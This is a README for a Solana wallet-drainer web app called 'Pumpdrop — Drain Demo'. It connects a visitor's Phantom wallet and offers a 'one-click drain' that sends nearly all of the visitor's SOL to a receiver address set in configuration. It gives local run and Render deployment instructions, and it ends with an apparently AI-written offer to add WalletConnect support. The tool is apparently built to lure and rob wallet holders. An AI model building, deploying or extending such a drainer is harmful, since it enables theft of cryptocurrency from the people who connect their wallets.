# Pumpdrop — Drain Demo (Phantom)

This version connects Phantom and includes:
- Read-only balance/eligibility
- Manual SOL transfer form
- One-click drain (sends max SOL minus 0.002 reserve to configured receiver)

Environment-configured via `/config.js` served by Node:
- RECEIVER_PUBKEY: destination for drain
- WC_PROJECT_ID: reserved (not required for Phantom)
- MORALIS_KEY: optional

Local run:
- `PORT=8041 RECEIVER_PUBKEY=<your_sol_address> node server.js`
- Open http://localhost:8041

Render deploy:
- The `render.yaml` defines a Node web service.
- On Render, set env vars:
  - RECEIVER_PUBKEY = your SOL address
  - WC_PROJECT_ID (optional)
  - MORALIS_KEY (optional)

Repo structure:
- server.js — static server + /config.js from env
- public/ — static assets

Note: WalletConnect for Solana is not required for Phantom. If you want WC, supply a project ID and I can wire `@solana/wallet-adapter-walletconnect` in a built bundle.
